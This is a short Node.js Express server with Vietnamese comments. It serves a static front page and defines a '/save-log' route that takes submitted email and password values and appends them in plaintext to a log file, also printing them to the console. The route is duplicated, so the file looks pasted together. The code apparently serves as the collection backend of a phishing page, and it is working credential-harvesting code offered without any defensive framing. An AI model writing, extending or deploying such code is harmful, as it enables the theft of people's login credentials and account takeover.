const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Cấu hình
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Route lưu log
app.post('/save-log', (req, res) => {
  const { email, password } = req.body;
  const logEntry = `[${new Date().toISOString()}] Email: ${email} | Password: ${password}\n`;

  fs.appendFile(path.join(logsDir, 'log.txt'), logEntry, (err) => {
    if (err) {
      console.error('❌ Lỗi ghi file:', err);
      return res.status(500).json({ error: 'Lỗi server' });
    }
    console.log('✅ Đã ghi log thành công');
    res.json({ success: true });
  });
});

// Route chính
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Khởi động server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server chạy tại: http://localhost:${PORT}`);
});
app.post('/save-log', (req, res) => {
  const { email, password } = req.body;
  const logEntry = `[${new Date().toISOString()}] Email: ${email} | Password: ${password}\n`;

  // Dùng 'a+' để tạo file nếu chưa có và append nội dung
  fs.appendFile(path.join(logsDir, 'log.txt'), logEntry, { flag: 'a+' }, (err) => {
    if (err) console.error('❌ Lỗi ghi file:', err);
    else console.log('✅ Đã ghi log:', logEntry.trim());
    res.json({ success: !err });
  });
});